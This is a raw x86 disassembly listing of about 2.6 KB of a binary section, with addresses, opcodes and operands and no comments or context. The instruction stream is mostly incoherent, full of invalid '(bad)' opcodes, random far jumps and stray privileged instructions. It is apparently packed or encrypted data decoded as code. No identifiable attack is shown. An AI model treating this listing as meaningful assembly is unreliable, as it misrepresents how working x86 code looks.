  415489:	pop    eax
  41548a:	ret    
  41548b:	jmp    0x85a55f9a
  415490:	pop    edx
  415491:	and    DWORD PTR [ebp-0x6a],esi
  415494:	mov    dl,0xbc
  415496:	add    eax,0x2bb80e63
  41549b:	pop    ecx
  41549c:	mov    esp,db5
  41549f:	test   BYTE PTR [edx],0x68
  4154a2:	call   0xd2a1b6a6
  4154a7:	dec    ebp
  4154a8:	dec    esi
  4154a9:	add    BYTE PTR [edx],0x3e
  4154ac:	(bad)  
  4154ae:	(bad)  
  4154af:	cld    
  4154b0:	pop    ecx
  4154b1:	add    bl,BYTE PTR [ebx+0x61]
  4154b4:	inc    edi
  4154b5:	mov    edi,0x6c31260c
  4154ba:	imul   esp,ebp,0x6c
  4154bd:	inc    ebp
  4154be:	push   ss
  4154bf:	gs cmc 
  4154c1:	sub    ecx,DWORD PTR [ebx]
  4154c3:	cmc    
  4154c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c5:	inc    edi
  4154c6:	dec    edi
  4154c7:	or     BYTE PTR [edx+ecx*1-0x1ac4f006],cl
  4154ce:	jge    0x415452
  4154d0:	push   edi
  4154d1:	inc    eax
  4154d2:	add    al,0xb9
  4154d4:	dec    ebp
  4154d5:	push   es
  4154d6:	ret    0xe30a
  4154d9:	enter  0x588f,0xbb
  4154dd:	mov    ebp,0x187490cb
  4154e2:	stos   BYTE PTR es:[edi],al
  4154e3:	add    al,0x54
  4154e5:	pop    ds
  4154e6:	jg     0x4154cc
  4154e8:	push   cs
  4154e9:	jmp    0x8ddc:0xab875b5
  4154f0:	mov    WORD PTR [ecx],ss
  4154f2:	int3   
  4154f3:	cmp    eax,DWORD PTR [esi+edi*4+0x50d56266]
  4154fa:	jnp    0x41555c
  4154fc:	sub    eax,0x2c666b29
  415501:	in     al,dx
  415502:	out    dx,al
  415503:	xor    BYTE PTR [ebx],dh
  415505:	mov    esp,DWORD PTR ds:0x7915dd84
  41550b:	dec    BYTE PTR [eax]
  41550d:	add    al,0xb2
  41550f:	mov    WORD PTR [edi-0x14211cf4],gs
  415515:	pusha  
  415516:	stc    
  415517:	add    al,0x9f
  415519:	(bad)  
  41551a:	fidivr WORD PTR [ebx-0x34]
  41551d:	jmp    0xd246:0x793f2ab4
  415524:	rcl    DWORD PTR [ebx],0xb7
  415527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415528:	dec    esi
  415529:	fdiv   QWORD PTR [edi+0x54]
  41552c:	stc    
  41552d:	fdivp  st(3),st
  41552f:	push   edi
  415530:	test   eax,0x8cf8b5a9
  415535:	jno    0x415582
  415537:	shl    BYTE PTR [edx+eiz*8-0x2313289e],cl
  41553e:	addr16 mov bl,0x3a
  415541:	cmp    DWORD PTR [eax-0x75],0x64
  415545:	mov    dl,0x5d
  415547:	jae    0x4155a7
  415549:	retf   
  41554a:	imul   eax,DWORD PTR ds:0xba207f7b,0x3c
  415551:	inc    ebx
  415552:	mov    eax,0x89893ca8
  415557:	xchg   esp,eax
  415558:	pop    edi
  415559:	push   ebp
  41555a:	pop    ss
  41555b:	jmp    0x5cde42cd
  415560:	(bad)
  415564:	push   eax
  415565:	adc    esp,DWORD PTR [esi-0x51857504]
  41556b:	mov    edi,0xed
	...
  4155d4:	add    BYTE PTR [eax],al
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415653
  4155e3:	push   0xe6580bb3
  4155e8:	add    BYTE PTR [eax],al
  4155ea:	inc    DWORD PTR [eax]
  4155ec:	add    BYTE PTR [eax],al
  4155ee:	loop   0x41557c
  4155f0:	pop    eax
  4155f1:	cmp    bh,dl
  4155f3:	popa   
  4155f4:	mov    esp,0x12e869a1
  4155f9:	jb     0x415594
  4155fb:	into   
  4155fc:	out    dx,eax
  4155fd:	cmp    ebp,DWORD PTR ds:[esi+0x14]
  415601:	xchg   esp,ebp
  415603:	or     al,0xf8
  415605:	ror    bl,1
  415607:	push   edx
  415608:	cmp    cl,BYTE PTR [ebx+0x29]
  41560b:	mov    cl,BYTE PTR [eax]
  41560d:	lea    ebx,[esi+ebx*2-0x10]
  415611:	mov    ecx,0xeca02656
  415616:	aas    
  415617:	lea    edi,[ebp-0x45ac954c]
  41561d:	add    eax,DWORD PTR [esi-0x5d]
  415620:	jge    0x4155dc
  415622:	sub    cl,bl
  415624:	sbb    al,0x5
  415626:	adc    ebx,esi
  415628:	jp     0x415654
  41562a:	fstp   DWORD PTR [eax]
  41562c:	dec    ecx
  41562d:	cmp    cl,BYTE PTR [edi+0x605af54]
  415633:	add    BYTE PTR [edx-0x61e3c4f0],0x33
  41563a:	(bad)  
  41563b:	mov    es,WORD PTR [ebx-0x32]
  41563e:	test   DWORD PTR [ecx-0xec6386],edi
  415644:	mov    esi,0x8cfb7ee5
  415649:	xor    al,0x39
  41564b:	test   DWORD PTR [edx+0xe],eax
  41564e:	mov    ecx,0xb724a8bc
  415653:	or     BYTE PTR ds:0x8eab0ba2,cl
  415659:	or     DWORD PTR [ecx+0x1e4bb662],esp
  41565f:	ins    BYTE PTR es:[edi],dx
  415660:	outs   dx,DWORD PTR ds:[esi]
  415661:	add    ch,BYTE PTR [ebx-0x2]
  415664:	aad    0x4d
  415666:	sar    DWORD PTR [edx],cl
  415668:	fld    TBYTE PTR [ecx-0x6f]
  41566b:	jmp    0x4156b7
  41566d:	lahf   
  41566e:	lock dec esp
  415670:	pushf  
  415671:	inc    eax
  415672:	out    0x29,eax
  415674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415675:	sbb    eax,0xdd3f734e
  41567a:	mov    edi,0x515ae7b4
  41567f:	dec    esi
  415680:	sub    bl,cl
  415682:	push   esi
  415683:	mov    eax,ds:0x4b28cf58
  415688:	adc    ch,BYTE PTR [ebx]
  41568a:	xchg   DWORD PTR ds:0x248e40b,ebx
  415690:	push   ebp
  415691:	in     al,0x14
  415693:	out    dx,al
  415694:	xor    DWORD PTR ds:[ecx-0x26ea6156],edx
  41569b:	pop    es
  41569c:	xor    al,0xad
  41569e:	xor    bh,bl
  4156a0:	xchg   edx,esi
  4156a2:	xor    al,bh
  4156a4:	push   ds
  4156a5:	cli    
  4156a6:	(bad)  
  4156a7:	push   ss
  4156a8:	ror    DWORD PTR [ebx],0x77
  4156ab:	inc    esi
  4156ac:	adc    DWORD PTR [ebp-0x43e8dcbe],ebp
  4156b2:	jnp    0x415707
  4156b4:	xor    al,0x10
  4156b6:	inc    eax
  4156b7:	repz lds edx,FWORD PTR [eax]
  4156ba:	daa    
  4156bb:	sub    al,0xd3
  4156bd:	sbb    esi,edi
  4156bf:	cmp    ch,BYTE PTR [edi-0x1f]
  4156c2:	hlt    
  4156c3:	rol    DWORD PTR [ebp+0x59],0x1
  4156c7:	enter  0xcc48,0x77
  4156cb:	fwait
  4156cc:	aad    0x7c
  4156ce:	xchg   DWORD PTR [eax],ecx
  4156d0:	push   ebx
  4156d1:	out    0xf,al
  4156d3:	or     esi,esp
  4156d5:	iret   
  4156d6:	jge    0x41566c
  4156d8:	pop    ebx
  4156d9:	ret    
  4156da:	push   esp
  4156db:	cld    
  4156dc:	pop    eax
  4156dd:	jb     0x4156a9
  4156df:	sbb    eax,0x50d863c
  4156e4:	loopne 0x415688
  4156e6:	push   ds
  4156e7:	xchg   ecx,eax
  4156e8:	dec    eax
  4156e9:	push   edx
  4156ea:	jmp    0x0:0x9313
	...
  415755:	add    BYTE PTR [ebp-0x66],ch
  415758:	mov    esp,0xfd67ff45
  41575d:	mov    edx,0x2c46bab3
  415762:	sub    edi,esi
  415764:	hlt    
  415765:	adc    al,0x57
  415767:	out    0x0,eax
  415769:	add    bh,bh
  41576b:	add    BYTE PTR [eax],al
  41576d:	add    BYTE PTR [esi],dh
  41576f:	dec    esp
  415770:	aas    
  415771:	sbb    eax,0x8cbdb462
  415776:	pop    esi
  415777:	sbb    ebx,DWORD PTR [edx-0x7a382ff2]
  41577d:	aas    
  41577e:	inc    esp
  41577f:	pop    ebp
  415780:	int    0x8f
  415782:	inc    edx
  415783:	in     al,dx
  415784:	mov    eax,ds:0x69d8004c
  415789:	call   0x7c5eea7
  41578e:	xor    eax,0x9c5eefca
  415793:	cdq    
  415794:	pushf  
  415795:	jnp    0x415742
  415797:	sbb    ah,bh
  415799:	and    al,0x8c
  41579b:	mov    ecx,0x3d4c1bd2
  4157a0:	inc    esp
  4157a1:	inc    ecx
  4157a2:	jmp    0x3c0d:0xa5d0727d
  4157a9:	adc    BYTE PTR [edx+eiz*4],bh
  4157ac:	je     0x4157e3
  4157ae:	mov    dh,BYTE PTR [esi-0x67]
  4157b1:	pop    esp
  4157b2:	mov    dl,0xb5
  4157b4:	leave  
  4157b5:	and    ch,ah
  4157b7:	neg    DWORD PTR [edi]
  4157b9:	jmp    DWORD PTR [edx-0x5c]
  4157bc:	shl    dh,cl
  4157be:	xor    eax,0x8f4946d3
  4157c3:	(bad)
  4157c7:	xchg   ebp,eax
  4157c8:	cmp    al,0x21
  4157ca:	jecxz  0x4157c3
  4157cc:	test   DWORD PTR [esi-0x50],0x37f0a0b8
  4157d3:	ds pop ebx
  4157d5:	cmp    DWORD PTR ds:0x29c58515,esi
  4157db:	scas   eax,DWORD PTR es:[edi]
  4157dc:	ins    BYTE PTR es:[edi],dx
  4157dd:	fwait
  4157de:	or     DWORD PTR [ecx],0xffffff91
  4157e1:	rcl    BYTE PTR [ebp+0x537134c6],0xb2
  4157e8:	neg    BYTE PTR [edi+ebp*2]
  4157eb:	imul   edi,DWORD PTR [ebx],0xffffff9e
  4157ee:	sub    ch,BYTE PTR [esi-0x6e]
  4157f1:	push   ss
  4157f2:	sbb    eax,0x861076cd
  4157f7:	pop    ss
  4157f8:	mov    ecx,0x182b8cd
  4157fd:	aaa    
  4157fe:	sub    edi,DWORD PTR [edx+eiz*4]
  415801:	retf   
  415802:	imul   ebp,DWORD PTR [ebx],0xe3cfa76f
  415808:	pop    ss
  415809:	adc    dh,BYTE PTR [edx+0x4fcc204b]
  41580f:	dec    eax
  415810:	sahf   
  415811:	fsub   DWORD PTR [ecx+edi*1-0x64]
  415815:	jno    0x4157ac
  415817:	add    eax,0xbfa46728
  41581c:	hlt    
  41581d:	and    DWORD PTR [ecx],ebx
  41581f:	adc    ch,dl
  415821:	mov    cl,0xcb
  415823:	or     ebp,DWORD PTR [edx-0x489524c]
  415829:	adc    al,0xb7
  41582c:	int3   
  41582d:	jp     0x4157ce
  41582f:	jb     0x415844
  415831:	sahf   
  415832:	bound  edx,QWORD PTR [edi-0x7ef10570]
  415838:	inc    eax
  415839:	xchg   ebp,eax
  41583a:	or     edx,ebx
  41583c:	cld    
  41583d:	inc    edi
  41583e:	jmp    0xc51e:0xa743617e
  415845:	jle    0x41586f
  415847:	xor    BYTE PTR [edi+0x558b59ba],ah
  41584d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584e:	repnz mov edx,0x14f1bcfb
  415854:	cs dec ebx
  415856:	(bad)  
  415857:	sbb    eax,DWORD PTR [eax-0x7d]
  41585a:	or     al,0xad
  41585c:	inc    ebp
  41585d:	push   esp
  41585e:	push   ss
  41585f:	lods   eax,DWORD PTR ds:[esi]
  415860:	bound  edx,QWORD PTR [ebp+0xb]
  415863:	imul   DWORD PTR [edi+0x2a]
  415866:	sub    al,BYTE PTR [eax+0x62]
  415869:	push   eax
  41586a:	sti    
  41586b:	cmp    al,0x8c
	...
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcr    DWORD PTR [edi-0x9],cl
  4158e4:	iret   
  4158e5:	cwde   
  4158e6:	push   esi
  4158e7:	call   0x14058ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	imul   ebx,DWORD PTR [eax+0x1b],0x4fa3126
  4158f5:	data16 icebp 
  4158f7:	clc    
  4158f8:	adc    eax,0x2ac638c9
  4158fd:	les    edi,FWORD PTR [edx+edx*2+0x15d34449]
  415904:	sbb    BYTE PTR [ebx],0x50
  415907:	mov    ebp,0x2e7a5afa
  41590c:	cli    
  41590d:	popa   
  41590e:	inc    ecx
  41590f:	ret    0x8694
  415912:	cmp    ch,al
  415914:	jg     0x4158a6
  415916:	push   ebx
  415917:	push   edi
  415918:	lea    esi,[esi-0x70]
  41591b:	sbb    ebp,DWORD PTR [edi+0x66]
  41591e:	mov    ah,0x1
  415920:	mov    bl,ah
  415922:	push   esi
  415923:	xlat   BYTE PTR ds:[ebx]
  415924:	ja     0x4158fc
  415926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415927:	inc    edi
  415928:	popf   
  415929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592a:	jbe    0x415936
  41592c:	pop    esi
  41592d:	ja     0x415918
  41592f:	cld    
  415930:	repz cdq 
  415932:	fstp   st(6)
  415934:	scas   al,BYTE PTR es:[edi]
  415935:	ficom  WORD PTR [ecx+0x4f]
  415938:	test   BYTE PTR [esi+0x31dac4a5],dh
  41593e:	fisub  WORD PTR [ecx-0x41]
  415941:	inc    eax
  415942:	popf   
  415943:	(bad)  
  415944:	cmc    
  415945:	sbb    al,0x64
  415947:	jb     0x4158d6
  415949:	cwde   
  41594a:	jns    0x41596c
  41594c:	(bad)  
  41594d:	push   edx
  41594e:	and    ebp,DWORD PTR [esi-0x2f6585db]
  415954:	fwait
  415955:	icebp  
  415956:	ret    
  415957:	inc    eax
  415958:	cmp    DWORD PTR [edx-0x64df6847],eax
  41595e:	mov    DWORD PTR [edx],ebx
  415960:	inc    ebp
  415961:	and    eax,0x3e2c6516
  415966:	ret    
  415967:	pop    esi
  415968:	call   0xdbe62127
  41596d:	data16 clc 
  41596f:	xchg   edx,eax
  415970:	ss (bad) 
  415972:	retf   
  415973:	or     al,0xff
  415975:	cs dec ebp
  415977:	(bad)  
  415978:	xor    eax,DWORD PTR [eax+ebp*8]
  41597b:	out    dx,eax
  41597c:	jbe    0x41594d
  41597e:	mov    bl,0xc9
  415980:	mov    esi,0xc0e8cecb
  415985:	and    DWORD PTR [ebx+0x78],ebx
  415988:	xchg   ecx,eax
  415989:	bound  esi,QWORD PTR [eax+0x55]
  41598c:	xchg   DWORD PTR [edi+0x4765b725],esi
  415992:	or     eax,0xcc67446c
  415997:	js     0x4159de
  415999:	mov    cl,0x6b
  41599b:	fmul   st,st(7)
  41599d:	aas    
  41599e:	and    DWORD PTR [edi],ebx
  4159a0:	xor    cl,ch
  4159a2:	scas   eax,DWORD PTR es:[edi]
  4159a3:	xchg   edi,eax
  4159a4:	les    ecx,FWORD PTR [ecx]
  4159a6:	push   0xffffffb1
  4159a8:	push   ebp
  4159a9:	daa    
  4159aa:	scas   ax,WORD PTR es:[edi]
  4159ac:	call   0x5cd65409
  4159b1:	xor    eax,0x1684e434
  4159b6:	sbb    eax,0xb9f73e5c
  4159bb:	pop    esi
  4159bc:	lods   eax,DWORD PTR ds:[esi]
  4159bd:	test   DWORD PTR [esi-0x2e],esi
  4159c0:	xchg   esi,eax
  4159c1:	mov    WORD PTR [ecx-0x17],ss
  4159c4:	jge    0x415a26
  4159c6:	push   es
  4159c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c8:	int    0xbe
  4159ca:	push   ss
  4159cb:	add    BYTE PTR [edx],ah
  4159cd:	adc    esp,DWORD PTR ds:0xffe0cc40
  4159d3:	pop    eax
  4159d4:	xlat   BYTE PTR ds:[ebx]
  4159d5:	aas    
  4159d6:	hlt    
  4159d7:	jmp    0x415a07
  4159d9:	ret    
  4159da:	and    al,bh
  4159dc:	and    DWORD PTR [ecx+edi*2+0x6d],eax
  4159e0:	pop    ebp
  4159e1:	mov    edx,0x10cccf14
  4159e6:	enter  0x64f8,0x77
  4159ea:	inc    edx
  4159eb:	js     0x41598e
	...
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	cld    
  415a63:	iret   
  415a64:	jnp    0x415a48
  415a66:	push   ebp
  415a67:	jmp    0x1405a6c
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	scas   al,BYTE PTR es:[edi]
  415a6f:	pop    ss
  415a70:	call   DWORD PTR [eax-0x465091cd]
  415a76:	inc    bl
  415a78:	pop    ebp
  415a79:	or     BYTE PTR [ecx],bl
  415a7b:	in     eax,0xa7
  415a7d:	sub    bh,BYTE PTR [eax]
  415a7f:	xlat   BYTE PTR ds:[ebx]
  415a80:	cli    
  415a81:	jae    0x415a50
  415a83:	fs hlt 
  415a85:	add    ecx,eax
  415a87:	mov    bl,0x7d
  415a89:	or     BYTE PTR [edx-0x4ae4ff33],ah
  415a8f:	je     0x415a9b
  415a91:	inc    ecx
  415a92:	gs mov dl,0xcf
  415a95:	js     0x415a96
  415a97:	daa    
  415a98:	sub    eax,0xef754caa
  415a9d:	loope  0x415a30
  415a9f:	loop   0x415a3a
  415aa1:	mov    al,0xd6
  415aa3:	xor    esp,DWORD PTR [ebx+0x52]
  415aa6:	dec    ebx
  415aa7:	mov    al,0x5d
  415aa9:	pop    es
  415aaa:	sub    edi,ebx
  415aac:	dec    DWORD PTR [ebp-0x54d3e43e]
  415ab2:	sbb    BYTE PTR [eax],al
  415ab4:	cmp    eax,0xd131f8a7
  415ab9:	jmp    0xe0fb:0x6480e837
  415ac0:	cmc    
  415ac1:	ret    
  415ac2:	retf   
  415ac3:	into   
  415ac4:	stc    
  415ac5:	ret    0x6228
  415ac8:	mov    ds:0x6c1f242c,al
  415acd:	ds inc esp
  415acf:	push   eax
  415ad0:	and    dl,al
  415ad2:	pop    ss
  415ad3:	lds    esi,FWORD PTR [edx-0x568f341]
  415ad9:	cmp    esi,DWORD PTR [ebp+ebx*4-0x51]
  415add:	pop    ebx
  415ade:	hlt    
  415adf:	stc    
  415ae0:	jbe    0x415af0
  415ae2:	clc    
  415ae3:	sbb    dl,0x92
  415ae6:	(bad)  
  415ae7:	or     al,dl
  415ae9:	adc    edi,DWORD PTR [ebx]
  415aeb:	mov    esp,DWORD PTR [esi+0x1a]
  415aee:	jae    0x415ac8
  415af0:	push   ebx
  415af1:	dec    eax
  415af2:	(bad)  
  415af3:	lods   al,BYTE PTR ds:[esi]
  415af4:	cs mov edx,0xc0bb5307
  415afa:	les    esp,FWORD PTR [edi+0x52ff5182]
  415b00:	jle    0x415a94
  415b02:	mov    dl,0x1a
  415b04:	xchg   ebp,eax
  415b05:	and    eax,0x235648c6
  415b0a:	stos   DWORD PTR es:[edi],eax
  415b0b:	add    al,0x8f
  415b0d:	mov    eax,ds:0x1c941e4c
  415b12:	mov    ebp,0x3f6d1dc7
  415b17:	pop    edx
  415b18:	addr16 and dh,ch
  415b1b:	cmp    BYTE PTR [edx],ch
  415b1d:	pop    es
  415b1e:	idiv   DWORD PTR [esi]
  415b20:	(bad)  
  415b21:	addr16 mov ds:0xd8a1,eax
  415b25:	mov    bh,0x33
  415b27:	(bad)  
  415b28:	xor    al,0x6b
  415b2a:	jg     0x415af6
  415b2c:	xor    al,BYTE PTR ds:[eax]
  415b2f:	jecxz  0x415af7
  415b31:	jge    0x415aeb
  415b33:	sbb    DWORD PTR gs:[ebx+0x49452970],edx
  415b3a:	jmp    0x150dada3
  415b3f:	push   cs
  415b40:	jmp    0x415afd
  415b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b43:	test   al,0x93
  415b45:	loope  0x415bb4
  415b47:	mov    esp,0x11d05f60
  415b4c:	mov    eax,ds:0x88f3e1b9
  415b51:	popa   
  415b52:	mov    bl,0x92
  415b54:	mov    ds:0x4e5bf599,al
  415b59:	(bad)
  415b5e:	push   ecx
  415b5f:	sbb    ecx,ebx
  415b61:	inc    edx
  415b62:	shl    DWORD PTR [edx+edx*2],cl
  415b65:	(bad)  
  415b66:	fcomp  st(5)
  415b68:	cmp    DWORD PTR [eax+0xd],esi
  415b6b:	jg     0x415bae
	...
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdivr  st(4),st
  415be3:	les    edx,FWORD PTR ds:0xea5407
  415be9:	add    bh,bh
  415beb:	add    BYTE PTR [eax],al
  415bed:	add    BYTE PTR [ebx],al
  415bef:	cmp    al,0x3c
  415bf1:	popa   
  415bf2:	cli    
  415bf3:	sbb    BYTE PTR [edi+0x33583fc],ah
  415bf9:	leave  
  415bfa:	and    eax,0xb0fcbe2a
  415bff:	fnstsw WORD PTR [ecx]
  415c01:	(bad)  
  415c03:	push   ss
  415c04:	fdivr  DWORD PTR [esi]
  415c06:	movq   mm3,QWORD PTR [ebp+0x7f]
  415c0a:	fisubr DWORD PTR [ebp-0x1a6551d4]
  415c10:	nop
  415c11:	mov    esp,0xb3c22838
  415c16:	data16 fisubr DWORD PTR [ebp+0x23]
  415c1a:	adc    DWORD PTR [ebp+0x42],edx
  415c1d:	mov    ds:0x785b2da6,eax
  415c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c23:	test   eax,esi
  415c25:	jmp    0x9167:0xa8722927
  415c2c:	outs   dx,BYTE PTR ds:[esi]
  415c2d:	hlt    
  415c2e:	popa   
  415c2f:	sar    BYTE PTR [esi-0x57],0xc5
  415c33:	xor    eax,0x7d7dd0b1
  415c38:	inc    edi
  415c39:	nop
  415c3a:	shl    DWORD PTR [ebx],0x8f
  415c3d:	adc    ebx,ebp
  415c3f:	mov    BYTE PTR [edi],bh
  415c41:	std    
  415c42:	sbb    ah,dh
  415c44:	outs   dx,DWORD PTR ds:[esi]
  415c45:	dec    esi
  415c46:	mov    eax,0x868fff08
  415c4b:	sub    BYTE PTR [eax-0x79068237],cl
  415c51:	imul   ebp,DWORD PTR [edi+edi*2-0x6ff4d22e],0x81953a1c
  415c5c:	retf   
  415c5d:	pop    edx
  415c5e:	int    0x6c
  415c60:	xor    BYTE PTR [esi-0x2688c195],dl
  415c66:	shl    BYTE PTR [eax],0xf7
  415c69:	pop    ds
  415c6a:	push   edi
  415c6b:	xchg   ebp,eax
  415c6c:	sub    DWORD PTR [ebx-0x23],ebp
  415c6f:	inc    ebx
  415c70:	and    al,0x7f
  415c72:	mov    edx,0xc69ab31f
  415c77:	stc    
  415c78:	inc    esp
  415c79:	out    0xf1,eax
  415c7b:	in     al,0xfe
  415c7d:	stos   DWORD PTR es:[edi],eax
  415c7e:	xor    ebx,ebx
  415c80:	inc    esp
  415c81:	loope  0x415cf4
  415c83:	test   BYTE PTR [eax],al
  415c85:	stos   DWORD PTR es:[edi],eax
  415c86:	mov    cl,0x7b
  415c88:	test   DWORD PTR [edi-0x63a4af34],esp
  415c8e:	mov    ah,0xfd
  415c90:	pop    ebp
  415c91:	test   BYTE PTR [edx+0x5f],0xd0
  415c95:	popf   
  415c96:	inc    ebp
  415c97:	ins    DWORD PTR es:[edi],dx
  415c98:	push   edi
  415c99:	bound  ebp,QWORD PTR [ecx-0x25]
  415c9c:	shl    DWORD PTR [ecx+edx*2-0x2c],cl
  415ca0:	ins    BYTE PTR es:[edi],dx
  415ca1:	je     0x415cc4
  415ca3:	pop    ss
  415ca4:	dec    edi
  415ca5:	int    0x63
  415ca7:	fs jb  0x415c47
  415caa:	adc    BYTE PTR [eax],ch
  415cac:	push   cs
  415cad:	mov    dh,0xf5
  415caf:	dec    edx
  415cb0:	lods   al,BYTE PTR ds:[esi]
  415cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb2:	mov    ah,0x66
  415cb4:	add    ecx,DWORD PTR [ecx+eiz*4]
  415cb7:	clc    
  415cb8:	(bad)  
  415cb9:	js     0x415c42
  415cbb:	add    DWORD PTR [eax-0x11efdc2f],0xb9e490a7
  415cc5:	mov    ah,0x4f
  415cc7:	xchg   ebp,eax
  415cc8:	push   ds
  415cc9:	ret    0x5a9f
  415ccc:	jae    0x415cbe
  415cce:	adc    ch,cl
  415cd0:	into   
  415cd1:	sub    cl,BYTE PTR [edi]
  415cd3:	mov    BYTE PTR [ecx+edx*4+0x5d50dbc1],0x6c
  415cdb:	mov    ds:0x761765e8,eax
  415ce0:	pusha  
  415ce1:	test   BYTE PTR [edi-0x328eb7d1],cl
  415ce7:	sub    BYTE PTR [ecx],ah
  415ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cea:	pop    esi
  415ceb:	sub    al,cl
	...
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x863d381f
  415d65:	retf   0xeb53
  415d68:	add    BYTE PTR [eax],al
  415d6a:	inc    DWORD PTR [eax]
  415d6c:	add    BYTE PTR [eax],al
  415d6e:	xchg   edx,eax
  415d6f:	clc    
  415d70:	inc    edi
  415d71:	fcom   QWORD PTR [ebp+0x368da0f0]
  415d77:	sbb    BYTE PTR [ebp-0x407d5ffa],0x2
  415d7e:	jl     0x415d6f
  415d80:	lds    edi,FWORD PTR [edi]
  415d82:	sti    
  415d83:	pop    edx
  415d84:	ins    BYTE PTR es:[edi],dx
  415d85:	fsub   st(2),st
  415d87:	stos   DWORD PTR es:[edi],eax
  415d88:	pop    esp
  415d89:	xor    BYTE PTR ds:0x6ca1,ch
  415d8e:	pop    esi
  415d8f:	jecxz  0x415dd7
  415d91:	dec    edi
  415d92:	repz jae 0x415e14
  415d95:	sub    BYTE PTR [ebx+0x2c219686],dl
  415d9b:	mov    ch,0x1b
  415d9d:	xchg   esp,eax
  415d9e:	xchg   edx,eax
  415d9f:	jmp    0xdc6392a
  415da4:	es dec edx
  415da6:	mov    ds,WORD PTR [edx-0x6fcea464]
  415dac:	and    BYTE PTR ds:0x2b0d6044,dh
  415db2:	jne    0x415e01
  415db4:	fbld   TBYTE PTR [edi]
  415db6:	xchg   esi,eax
  415db7:	je     0x415d81
  415db9:	mov    eax,ds:0xc4cb3986
  415dbe:	loopne 0x415df9
  415dc0:	fwait
  415dc1:	in     eax,0x76
  415dc3:	pop    edx
  415dc4:	mov    ch,0x44
  415dc6:	or     ecx,ecx
  415dc8:	cmp    BYTE PTR [esi-0x61],dl
  415dcb:	fwait
  415dcc:	push   edi
  415dcd:	aam    0x7c
  415dcf:	xor    eax,0x7880cd9c
  415dd4:	les    ebx,FWORD PTR [edx]
  415dd6:	and    eax,0x31996b35
  415ddb:	ja     0x415d9b
  415ddd:	(bad)  
  415dde:	test   eax,0x6f462e0b
  415de3:	xchg   edi,eax
  415de4:	mov    bl,0xcd
  415de6:	test   BYTE PTR [esi],0x0
  415de9:	push   0xffffffe2
  415deb:	enter  0xed73,0x7
  415def:	je     0x415e3a
  415df1:	ja     0x415e03
  415df3:	int    0x73
  415df5:	aad    0x6a
  415df7:	lahf   
  415df8:	add    cl,bh
  415dfa:	adc    ch,BYTE PTR [edi+0x29939855]
  415e00:	pushf  
  415e01:	sub    al,BYTE PTR [ebx+0x64af5016]
  415e07:	xchg   ebx,eax
  415e08:	xor    al,0xf6
  415e0a:	push   esi
  415e0c:	lea    ebp,fs:[bp+si]
  415e10:	push   0xffffff9b
  415e12:	and    al,0x99
  415e14:	aam    0xb8
  415e16:	repnz mov al,dh
  415e19:	dec    esi
  415e1a:	jl     0x415e88
  415e1c:	pop    edx
  415e1d:	mov    ebp,0xb068169c
  415e22:	xchg   ebx,eax
  415e23:	pop    ecx
  415e24:	mov    BYTE PTR [esi+0x2f],cl
  415e27:	ss pop esi
  415e29:	test   BYTE PTR [eax+0x11],ch
  415e2c:	pop    ebx
  415e2d:	add    al,0x40
  415e2f:	jmp    0x1862d601
  415e34:	and    esi,esi
  415e36:	test   DWORD PTR ds:0x1868fffc,esi
  415e3c:	mov    cl,0x38
  415e3e:	cmp    BYTE PTR [ebx],dh
  415e40:	and    eax,0x8014be7e
  415e45:	xchg   BYTE PTR [esp+ecx*8],dh
  415e48:	or     bl,BYTE PTR [ebp-0x48]
  415e4b:	xchg   edi,eax
  415e4c:	pop    ebp
  415e4d:	(bad)  
  415e4e:	cmp    ecx,DWORD PTR [edi+0x57]
  415e51:	enter  0x67fc,0x90
  415e55:	retf   0x2b08
  415e58:	and    bh,BYTE PTR [edi]
  415e5a:	stos   DWORD PTR es:[edi],eax
  415e5b:	inc    esp
  415e5c:	jo     0x415ded
  415e5e:	test   eax,0x55159dfd
  415e63:	sbb    BYTE PTR [esi+0x4a28559c],bh
  415e69:	push   ds
  415e6a:	push   ecx
  415e6b:	cmp    ah,ah
	...
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x4f]
  415ee3:	adc    cl,BYTE PTR [ebx]
  415ee5:	not    BYTE PTR [edx-0x14]
  415ee8:	add    BYTE PTR [eax],al
  415eea:	inc    DWORD PTR [eax]
  415eec:	add    BYTE PTR [eax],al
  415eee:	ss enter 0xc858,0x52
  415ef3:	ret    
  415ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef5:	inc    edi
  415ef6:	aaa    
  415ef7:	test   BYTE PTR [ebx+0x23],cl
